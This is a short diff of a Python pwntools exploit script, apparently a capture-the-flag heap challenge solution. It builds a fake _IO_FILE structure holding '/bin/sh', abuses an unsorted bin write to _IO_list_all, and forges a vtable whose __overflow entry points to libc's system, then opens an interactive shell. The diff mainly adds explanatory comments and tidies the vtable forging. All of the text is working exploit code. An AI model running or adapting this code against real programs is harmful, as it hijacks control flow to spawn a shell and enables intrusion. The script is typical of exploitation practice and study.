@@ -80,21 +80,22 @@ if __name__ == "__main__":
     pause()
 
     fake_file = flat("/bin/sh\0", 0x61)
-    fake_file += flat(0xdeadbeef, _IO_list_all - 0x10)
+    fake_file += flat(0xdeadbeef, _IO_list_all - 0x10) # unsorted bin -> fd/bk
     fake_file += flat(0, 1) # _IO_write_base; _IO_write_ptr
     fake_file = fake_file.ljust(0xc0, '\0')
     fake_file += p64(0) # mode <= 0
 
     payload = flat('5' * 0x400, 0, 0x21, 0xddaa00000001, 0)
     payload += fake_file
-    payload += flat(0, 0, heapbase + 0x5d0)
-    payload += flat(0, 0, 0)
-    payload += p64(libc.sym['system'])
+    payload += flat(0, 0, heapbase + 0x5d0) # 0xc8, 0xd0, vtable
+    # forge vtable
+    fake_vtable = flat(0, 0, 0, libc.sym['system']) # __dummy, __dummy2, __finish, __overflow
+    payload += fake_vtable
 
     upgrade(0x800, payload)
     sleep(0.01)
 
-    DEBUG()
+    #  DEBUG()
     io.sendlineafter("choice : ", "1")
 
     io.interactive()
